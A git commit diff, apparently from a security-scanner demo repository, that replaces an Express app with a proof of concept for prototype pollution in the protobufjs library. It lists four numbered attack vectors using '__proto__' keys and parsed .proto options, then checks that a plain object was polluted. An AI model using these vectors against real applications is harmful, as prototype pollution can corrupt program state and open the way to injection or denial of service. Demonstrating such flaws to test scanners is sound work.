1ee38c0e45cf790a61d3e9cd4c581de621938094
Asaf Cohen <asafc@jfrog.com>
2022-10-12 16:20:52 +0300

    add frogbot yaml

--- index.js
+++ index.js
@@ -1,35 +1,29 @@
 // index.js
+protobuf = require("protobufjs");
 
-/**
- * Required External Modules
- */
+// Object.freeze(Object.prototype);
 
-const express = require("express");
-const path = require("path");
- /**
- * App Variables
- */
-const app = express();
-const port = process.env.PORT || "3000";
-/**
- *  App Configuration
- */
-app.set("views", path.join(__dirname, "views"));
-app.set("view engine", "pug");
-app.use(express.static(path.join(__dirname, "public")));
-/**
- * Routes Definitions
- */
-app.get("/", (req, res) => {
-    res.render("index", { title: "Home" });
-  });
+let person1 = {firstName:"John", lastName:"Doe", age:50, eyeColor:"blue"};
+let person2 = {firstCoolName:"John", lastName:"Doe", age:50, eyeColor:"blue"};
 
-app.get("/user", (req, res) => {
-    res.render("user", { title: "Profile", userProfile: { nickname: "Auth0" } });
-  });  
-/**
- * Server Activation
- */
-app.listen(port, () => {
-    console.log(`Listening to requests on http://localhost:${port}`);
-  });
+// Vector 1
+let evilkey = "__proto__.firstName"
+let evilval = "evilvalue"
+protobuf.util.setProperty(person1, evilkey, evilval); 
+
+// Vector 2
+let obj = new protobuf.ReflectionObject("Test")
+obj.setParsedOption({}, evilval, evilkey);
+
+// Vector 3
+let p = `option (foo).__proto__.someprop= "somevalue";` 
+protobuf.parse(p)
+
+// Vector 4
+protobuf.load("/path/to/untrusted.proto", function(err, root) { return });
+
+
+console.log({}.firstName); 
+
+console.log(person1.firstName); 
+console.log(person2.firstName); 
